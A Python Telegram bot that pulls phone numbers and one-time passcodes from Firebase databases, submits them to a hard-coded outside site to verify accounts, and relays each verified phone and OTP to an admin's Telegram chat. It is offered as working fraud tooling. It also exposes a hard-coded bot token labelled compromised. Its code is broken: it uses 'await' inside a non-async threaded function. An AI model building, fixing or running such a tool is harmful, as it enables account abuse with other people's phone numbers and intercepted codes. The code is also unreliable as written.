import requests
import json
import time
from datetime import datetime
from threading import Thread
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ===== CONFIG =====
BOT_TOKEN = "8681990378:AAFbGpzsTXc7dBsl02aQQxk7iqsR64kCRz8"  # COMPROMISED
ADMIN_ID =  5999496406 # Replace with your Telegram ID
FIREBASE_DB_FILE = "firebase_links.json"
TARGET_URL = "https://cyberking-1.online/index.php"
SESSIONS = {}  # Per-Firebase session
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android) AppleWebKit/537.36"
}

# ===== TELEGRAM KEYBOARD =====
keyboard = [['🔍 Status', '📌 Add Firebase'], ['🗑 Clear All']]
reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ===== FIREBASE I/O =====
def load_firebase_links():
    try:
        with open(FIREBASE_DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_firebase_links(links):
    with open(FIREBASE_DB_FILE, 'w') as f:
        json.dump(links, f)

# ===== SCRAPE & AUTO VERIFY =====
def get_numbers_from_firebase(firebase_url):
    try:
        url = firebase_url.strip()
        if not url.endswith(".json"):
            url += ".json"
        resp = requests.get(url, timeout=10)
        if resp.status_code != 200:
            return []
        data = resp.json()
        numbers = []
        if isinstance(data, dict):
            for k, v in data.items():
                if isinstance(v, dict) and 'phone' in v:
                    numbers.append((k, v['phone'], v.get('otp'), url))
        return numbers
    except Exception as e:
        print(f"[-] Firebase fetch failed {url}: {e}")
        return []

def submit_phone_to_site(phone):
    try:
        s = requests.Session()
        s.headers.update(HEADERS)
        resp = s.get(TARGET_URL, timeout=10)
        payload = {"phone": phone, "submit": "1"}
        r = s.post(TARGET_URL, data=payload, timeout=10)
        if "otp" in r.text.lower() or "sent" in r.text.lower():
            SESSIONS[phone] = s
            return True
        return False
    except Exception as e:
        print(f"[-] Submit failed: {e}")
        return False

def submit_otp(otp, phone):
    try:
        s = SESSIONS.get(phone)
        if not s:
            s = requests.Session()
        payload = {"otp": otp, "verify": "1"}
        r = s.post(TARGET_URL, data=payload, timeout=10)
        if "success" in r.text.lower() or "verified" in r.text.lower():
            return True
        return False
    except:
        return False

def monitor_firebase(firebase_url, context: ContextTypes.DEFAULT_TYPE):
    while True:
        try:
            numbers = get_numbers_from_firebase(firebase_url)
            for node_id, phone, otp, url in numbers:
                if phone and submit_phone_to_site(phone):
                    print(f"[+] Sent {phone}")
                    # Wait for OTP
                    for _ in range(60):
                        time.sleep(2)
                        data = get_numbers_from_firebase(url)
                        for n, p, o, _ in data:
                            if p == phone and o:
                                if submit_otp(o, p):
                                    await context.bot.send_message(
                                        chat_id=ADMIN_ID,
                                        text=f"✅ Verified: {p} | OTP: {o}"
                                    )
                                break
                        else:
                            continue
                        break
        except Exception as e:
            print(f"[-] Monitor error: {e}")
        time.sleep(10)

# ===== TELEGRAM COMMANDS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Access Denied.")
        return
    await update.message.reply_text(
        "🔥 Firebase OTP Auto-Submit Bot\n"
        "Use buttons to control.\n"
        "Send Firebase DB link to add.",
        reply_markup=reply_markup
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    links = load_firebase_links()
    count = len(links)
    await update.message.reply_text(f"📌 Active Firebase DBs: {count}\n"
                                   f"🟢 Monitoring for numbers...\n"
                                   f"🕒 Last check: {datetime.now().strftime('%H:%M:%S')}")

async def add_firebase_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔗 Send Firebase Realtime DB link (e.g. https://xxx.firebaseio.com/path)")

async def receive_firebase_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    url = update.message.text.strip()
    if "firebaseio.com" not in url:
        await update.message.reply_text("❌ Invalid Firebase URL.")
        return
    links = load_firebase_links()
    if url not in links:
        links.append(url)
        save_firebase_links(links)
        # Start monitoring thread
        Thread(target=monitor_firebase, args=(url, context), daemon=True).start()
        await update.message.reply_text(f"✅ Added:\n{url}")
    else:
        await update.message.reply_text("📍 Already added.")

async def clear_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    save_firebase_links([])
    SESSIONS.clear()
    await update.message.reply_text("🗑 Cleared all Firebase links & sessions.")

# ===== MAIN =====
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Regex("^🔍 Status$"), status))
    app.add_handler(MessageHandler(filters.Regex("^📌 Add Firebase$"), add_firebase_prompt))
    app.add_handler(MessageHandler(filters.Regex("^🗑 Clear All$"), clear_all))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_firebase_link))

    # Load and start monitoring all saved Firebase DBs
    saved_links = load_firebase_links()
    for link in saved_links:
        Thread(target=monitor_firebase, args=(link, None), daemon=True).start()
        print(f"[+] Monitoring: {link}")

    print("[+] Bot started. Awaiting commands...")
    app.run_polling()

if __name__ == '__main__':
    main()
